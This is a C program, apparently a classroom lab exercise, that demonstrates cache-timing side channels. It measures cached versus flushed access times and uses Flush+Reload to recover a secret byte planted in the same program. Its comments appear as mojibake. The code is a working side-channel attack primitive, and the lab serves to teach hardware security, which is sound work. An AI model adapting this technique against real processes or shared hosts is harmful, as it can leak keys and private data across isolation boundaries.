#include <emmintrin.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

uint8_t array1[10 * 4096];
uint8_t array2[256 * 4096];  //uint8_t = unsigned char
int temp;
unsigned char secret = 94;
/* cache hit time threshold assumed*/

int CacheTime() {
    int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t* addr;
    int i;
    // ��ʼ������
    for (i = 0; i < 10; i++) array1[i * 4096] = 1;
    // ˢ�»���
    for (i = 0; i < 10; i++) _mm_clflush(&array1[i * 4096]);
    // ��������������Ԫ��
    array1[3 * 4096] = 100;
    array1[7 * 4096] = 200;
    for (i = 0; i < 10; i++) {
        addr = &array1[i * 4096];
        time1 = __rdtscp(&junk);                   //(1)
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;           //(2)
        printf("Access time for array[%d*4096]: %d CPU cycles\n", i, (int)time2);
    }
    return 0;
}


void flushSideChannel() {
    int i;
    // ��дһ�飬��ֹCopy-on-write��д�븴�ƻ��ƣ�
    for (i = 0; i < 256; i++) array2[i * 4096 + DELTA] = 1;
    // Flush the values of the array from cache
    for (i = 0; i < 256; i++) _mm_clflush(&array2[i * 4096 + DELTA]);
}
void victim() {
    temp = array2[secret * 4096 + DELTA];
}
void reloadSideChannel() {
    int junk = 0;
    register uint64_t time1, time2;//register���η���ʾ���������Ӧ�ı�������Ƶ����ʹ��
    volatile uint8_t* addr;//volatile�������ʱ��CPU�����ڴ��ַ������ȡֵ
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array2[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);//__rdtscpָ���CPU������������ʱ��������
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
            printf("The Secret = %d.\n", i);
        }
    }
}
int FlushReload() {
    flushSideChannel();
    victim();
    reloadSideChannel();
    return (0);
}

int main(int argc, const char** argv) {
        printf("-----Choose An Attack You Want To Test: -----\n");
        printf("1.CacheTime    2.FlushReload\n");
        char c = 0;
        scanf("%c\n", &c);
        if (c == '1')
            CacheTime();
        else if (c == '2')
            FlushReload();
        else 
            return 0;
}